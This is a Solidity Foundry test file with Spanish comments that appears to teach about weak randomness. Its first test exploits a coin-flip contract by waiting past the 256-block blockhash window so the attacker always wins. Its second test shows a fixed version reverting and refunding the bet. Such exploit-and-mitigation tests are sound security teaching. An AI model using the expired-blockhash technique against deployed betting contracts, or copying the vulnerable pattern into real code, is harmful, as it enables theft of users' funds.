// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {DelayedCoinFlip} from "../../src/weak-randomness/target/DelayedCoinFlip.sol";
import {DelayedCoinFlipFixed} from "../../src/weak-randomness/mitigations/DelayedCoinFlipFixed.sol";

contract WeakRandomness02Test is Test {
    DelayedCoinFlip coinFlip;
    DelayedCoinFlipFixed coinFlipFixed;

    address attacker = makeAddr("attacker");

    function setUp() public {
        coinFlip = new DelayedCoinFlip();
        vm.deal(address(this), 2 ether);
        coinFlip.fund{value: 2 ether}();

        coinFlipFixed = new DelayedCoinFlipFixed();
        vm.deal(address(this), 2 ether);
        coinFlipFixed.fund{value: 2 ether}();
    }

    /// @dev El atacante apuesta `true`, deja pasar más de 256 bloques desde
    ///      targetBlock, y resuelve: blockhash(targetBlock) ya está fuera de
    ///      la ventana de 256 bloques que la EVM puede consultar -> devuelve
    ///      bytes32(0), no revierte. uint256(0) % 2 == 0 es SIEMPRE true:
    ///      apostar `true` y esperar lo suficiente gana con certeza.
    function test_exploit_expiredBlockhash() public {
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        coinFlip.placeBet{value: 1 ether}(true);

        (, uint256 targetBlock, ) = coinFlip.bets(attacker);

        vm.roll(targetBlock + 257);
        assertEq(blockhash(targetBlock), bytes32(0), "confirmamos el comportamiento documentado");

        vm.prank(attacker);
        coinFlip.resolve();

        (, , bool resolved) = coinFlip.bets(attacker);
        assertTrue(resolved);
        assertEq(attacker.balance, 2 ether, "gano con certeza, no con ~50% de probabilidad");
    }

    /// @dev Mismo intento contra DelayedCoinFlipFixed: resolve() ya exige
    ///      block.number <= targetBlock + 256, así que intentar resolver en
    ///      targetBlock + 257 revierte "Window expired" en vez de leer un
    ///      blockhash caducado. claimRefund() sí permite recuperar la
    ///      apuesta original una vez expirada la ventana.
    function test_mitigation_blocksExpiredBlockhash() public {
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        coinFlipFixed.placeBet{value: 1 ether}(true);

        (, uint256 targetBlock, ) = coinFlipFixed.bets(attacker);
        vm.roll(targetBlock + 257);

        vm.prank(attacker);
        vm.expectRevert(bytes("Window expired"));
        coinFlipFixed.resolve();

        vm.prank(attacker);
        coinFlipFixed.claimRefund();
        assertEq(attacker.balance, 1 ether, "recupera la apuesta original, sin ganancia ni perdida");
    }
}
